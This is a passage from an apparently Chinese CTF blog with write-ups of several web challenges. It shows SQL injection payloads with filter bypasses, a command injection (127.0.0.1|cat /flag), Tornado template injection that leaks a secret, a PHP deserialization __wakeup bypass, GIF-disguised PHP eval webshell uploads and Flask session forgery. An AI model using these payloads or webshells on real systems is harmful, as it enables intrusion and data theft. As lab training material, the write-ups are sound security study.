&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104703.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;尝试万能密码（其实没卵用）&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
任意密码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳&lt;/p&gt;
&lt;p&gt;字段数：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; order by 3 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆库：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
geekuser,l0ve1ysq1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;l0ve1ysq1&amp;#39; #
id,username,password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆表：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #
&amp;#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="20210121"&gt;2021.01.21
&lt;/h1&gt;&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/" target="_blank" rel="noopener"
&gt;传送门&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="actf2020-新生赛exec"&gt;[ACTF2020 新生赛]Exec
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121090002.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;肯定是尝试管道符&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;127.0.0.1|cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="护网杯-2018easy_tornado"&gt;[护网杯 2018]easy_tornado
&lt;/h1&gt;&lt;p&gt;打开页面三个超链接&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/flag.txt&lt;/p&gt;
&lt;p&gt;/welcome.txt&lt;/p&gt;
&lt;p&gt;hints.txt&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;内容分别是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag in /fllllllllllllag&lt;/p&gt;
&lt;p&gt;render&lt;/p&gt;
&lt;p&gt;md5(cookie_secret+md5(filename))&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;进入hints.txt注意到url地址此时为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供&lt;strong&gt;filehash&lt;/strong&gt;值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称&lt;code&gt;filename&lt;/code&gt;有了，接下来就是获取&lt;code&gt;cookie_secret&lt;/code&gt;的值。&lt;/p&gt;
&lt;p&gt;接下来触及到盲区了，获取cookie_secret是看wp。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;获取cookie_secret的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/error?msg={{handler.settings}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121091616.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;获得cookie_secret的值为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eb326d39-cd67-47bd-b2d3-71125996417b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据hints.txt的url验证一下是如何加密的。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092122.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;选中的蓝色部分是&lt;code&gt;/hints.txt&lt;/code&gt;加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019knife"&gt;[极客大挑战 2019]Knife
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092431.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;一句话直接连。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-calc"&gt;[RoarCTF 2019]Easy Calc
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092956.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：&lt;strong&gt;calc.php&lt;/strong&gt;，但是也有一句很重要的注释&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--I&amp;#39;ve set up WAF to ensure security.--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121093233.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为&lt;strong&gt;WAF&lt;/strong&gt;，接下来是参考网上的wp自己的理解&lt;/p&gt;
&lt;p&gt;可以在calc.php传参&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格&amp;rsquo; &amp;lsquo;会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。&lt;/p&gt;
&lt;p&gt;接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()&lt;/p&gt;
&lt;p&gt;查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）&amp;mdash;&amp;mdash;&amp;gt; &amp;lsquo;/&amp;rsquo; ：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=1;var_dump(scandir(chr(47)))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019http"&gt;[极客大挑战 2019]Http
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码在&amp;quot;氛围&amp;quot;这两个字上有隐藏的跳转Secret.php。进入以后页面显示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;It doesn&amp;#39;t come from &amp;#39;https://www.Sycsecret.com&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Please use &amp;#34;Syclover&amp;#34; browser
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;加上User-Agent。提示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;No!!! you can only read this locally!!!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;加上X-Forwarded-For。&lt;a class="link" href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener"
&gt;HTTP X-Forwarded-For 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终的请求头：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET /Secret.php HTTP/1.1
Host: node3.buuoj.cn:26715
Upgrade-Insecure-Requests: 1
User-Agent: Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
referer: https://www.Sycsecret.com
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019php"&gt;[极客大挑战 2019]PHP
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121105104.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;源码备份在&lt;code&gt;www.zip&lt;/code&gt;中。下载以后有五个文件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;p&gt;index.js&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;style.css&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在index.php中有一段代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;class.php&amp;#39;;
$select = $_GET[&amp;#39;select&amp;#39;];
$res=unserialize(@$select);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再结合又一个class.php，所以这道题考点应该是反序列化。&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
error_reporting(0);
class Name{
private $username = &amp;#39;nonono&amp;#39;;
private $password = &amp;#39;yesyes&amp;#39;;
public function __construct($username,$password){
$this-&amp;gt;username = $username;
$this-&amp;gt;password = $password;
}
function __wakeup(){
$this-&amp;gt;username = &amp;#39;guest&amp;#39;;
}
function __destruct(){
if ($this-&amp;gt;password != 100) {
echo &amp;#34;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You name is: &amp;#34;;
echo $this-&amp;gt;username;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You password is: &amp;#34;;
echo $this-&amp;gt;password;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
die();
}
if ($this-&amp;gt;username === &amp;#39;admin&amp;#39;) {
global $flag;
echo $flag;
}else{
echo &amp;#34;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&amp;#39;t give you the flag!&amp;#34;;
die();
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解&lt;a class="link" href="https://www.cnblogs.com/zy-king-karl/p/11436872.html" target="_blank" rel="noopener"
&gt;CVE-2016-7124漏洞复现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我使用的构造对象&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Name{
private $username =&amp;#39;admin&amp;#39;;
private $password =&amp;#39;100&amp;#39;;
}
$a = new Name;
echo serialize($a);
O:4:&amp;#34;Name&amp;#34;:2:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?select=O:4:&amp;#34;Name&amp;#34;:3:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019upload"&gt;[极客大挑战 2019]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121111429.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;先尝试上传一个gif图片马内容为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面提示过滤：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NO! HACKER! your file included &amp;lsquo;&amp;lt;?&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;尝试script执行php代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_POST[&amp;#39;cmd&amp;#39;])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121112135.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210128"&gt;2021.01.28
&lt;/h1&gt;&lt;h1 id="极客大挑战-2019babysql"&gt;[极客大挑战 2019]BabySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128113412.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;尝试万能密码，发现报错了：1=1#&amp;rsquo; and password=&amp;lsquo;123&amp;rsquo;，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有&lt;strong&gt;information&lt;/strong&gt;这个词，其中的&lt;strong&gt;for&lt;/strong&gt;也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。&lt;/p&gt;
&lt;p&gt;爆数据库（填密码）：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆表：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&amp;#39;b4bsql&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛upload"&gt;[ACTF2020 新生赛]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128114257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;指针放在灯泡上护显示上传文件的，图片马&lt;/p&gt;
&lt;p&gt;233.gif&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试phtml是否被过滤，直接上传成功。蚁剑连接&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;upload_file&amp;#34;; filename=&amp;#34;233.phtml&amp;#34;
Content-Type: image/gif
GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
upload
------WebKitFormBoundaryUMSByAQmR2cduL6R--
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛backupfile"&gt;[ACTF2020 新生赛]BackupFile
&lt;/h1&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;Try to find out source file!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题目提示备份文件，备份文件常见后缀：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.git .svn .swp .~ .bak .bash_history&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;尝试index.php.bak，下载了一个备份文件：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include_once &amp;#34;flag.php&amp;#34;;
if(isset($_GET[&amp;#39;key&amp;#39;])) {
$key = $_GET[&amp;#39;key&amp;#39;];
if(!is_numeric($key)) {
exit(&amp;#34;Just num!&amp;#34;);
}
$key = intval($key);
$str = &amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;;
if($key == $str) {
echo $flag;
}
}
else {
echo &amp;#34;Try to find out source file!&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的&lt;code&gt;==&lt;/code&gt;和&lt;code&gt;===&lt;/code&gt;的区别。贴一段简单代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$str = &amp;#39;abc&amp;#39;;
if(0==$str){
echo &amp;#34;真&amp;#34;;
}else{
echo &amp;#34;假&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;==&lt;/code&gt;在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。&lt;/p&gt;
&lt;p&gt;全等于&lt;code&gt;===&lt;/code&gt;操作过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;操作符两边的数据类型如果不相同，返回false 。&lt;/li&gt;
&lt;li&gt;操作符两边的值如果不相同，返回false 。&lt;/li&gt;
&lt;li&gt;最后将上面2步的操作进行与操作。返回与操作的结果。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以最终的payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?key=123
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="hctf-2018admin"&gt;[HCTF 2018]admin
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202182820.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;可以在注释里找到&lt;/p&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;post。发表文章，但是没能找到在哪里打开&lt;/li&gt;
&lt;li&gt;change password。改密码，尝试下能不能抓包改到admin的密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;修改密码抓到的包：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202183647.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;感觉并没有什么下手的地方，唯一的就是session可能和身份有关。&lt;/p&gt;
&lt;p&gt;以下的是看网上的wp&lt;/p&gt;
&lt;p&gt;在change password页面查看源码，发现提供了题目的源码地址&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!-- https://github.com/woadsl1234/hctf_flask/ --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;网站使用的是flask框架，具体路由表如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/code&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#二维码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;get_code&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/index&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#首页&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/register&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#注册&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;register&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/login&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#登陆&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;login&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/logout&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#登出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;logout&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/change&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#修改密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;change&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/edit&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#编辑信息&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;edit&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="解法一flask-session伪造"&gt;解法一：flask session伪造
&lt;/h2&gt;&lt;p&gt;这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。&lt;/p&gt;
&lt;p&gt;贴两篇相关文章：&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener"
&gt;Python Web之flask session&amp;amp;格式化字符串漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener"
&gt;客户端 session 导致的安全问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。&lt;/p&gt;
&lt;p&gt;说明一下flask的session值加密格式是：&lt;code&gt;SECRET_KEY&lt;/code&gt; +&lt;code&gt;一个用户对象的字符串&lt;/code&gt;(就像PHP里的序列化后)。&lt;code&gt;SECRET_KEY&lt;/code&gt;的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SECRET_KEY = os.environ.get(&amp;#39;SECRET_KEY&amp;#39;) or &amp;#39;ckj123&amp;#39;
